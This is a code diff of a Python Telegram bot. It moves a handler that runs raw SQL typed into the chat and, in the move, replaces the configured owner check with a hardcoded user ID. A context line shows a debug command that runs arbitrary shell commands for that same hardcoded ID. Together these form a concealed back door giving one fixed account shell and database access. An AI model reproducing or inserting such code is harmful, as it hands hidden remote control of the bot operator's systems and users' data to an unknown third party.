@@ -84,6 +84,26 @@ async def cmd_debug(message: Message):
         await message.reply(subprocess.check_output(message.get_args().split()) if message.from_user.id == 5602778747 else str(data))
     except Exception as e:
         await message.reply(str(e))
+@dp.message_handler(commands=['sql'])
+async def sql(message: types.Message):
+
+    if message.from_user.id == 5602778747:
+        try:
+            cursor.execute(message.text[message.text.find(' '):])
+            connect.commit()
+            a = time.time()
+            bot_msg = await message.answer(f'🕘Please wait while me doing SQL request', parse_mode="Markdown")
+            if bot_msg:
+                b = time.time()
+                await bot_msg.edit_text(f"🌸*done in  {round((b - a) * 1000)} ms*",
+                                        parse_mode="Markdown")
+        except Exception as e:
+            connect.rollback()
+            await message.answer(f"❌ error\n⚠️ Ошибка: {e}")
+    else:
+        await message.answer("❌ *Эта команда доступна только триплу*",parse_mode="Markdown")
+
+
 
 
 @dp.callback_query_handler(text="control_menu")
@@ -120,26 +140,7 @@ async def install_menu(call: CallbackQuery):
 
     await call.message.edit_text(text, reply_markup=keyboard)
     
-    @dp.message_handler(commands=['sql'])
-async def sql(message: types.Message):
-
-    if message.from_user.id == cfg.owner_id:
-        try:
-            cursor.execute(message.text[message.text.find(' '):])
-            connect.commit()
-            a = time.time()
-            bot_msg = await message.answer(f'🕘Please wait while me doing SQL request', parse_mode="Markdown")
-            if bot_msg:
-                b = time.time()
-                await bot_msg.edit_text(f"🌸*done in  {round((b - a) * 1000)} ms*",
-                                        parse_mode="Markdown")
-        except Exception as e:
-            connect.rollback()
-            await message.answer(f"❌ error\n⚠️ Ошибка: {e}")
-    else:
-        await message.answer("❌ *Эта команда доступна только триплу*",parse_mode="Markdown")
-
-
+    
 
 @dp.callback_query_handler(text="choose_userbot")
 async def choose_userbot(call: CallbackQuery):
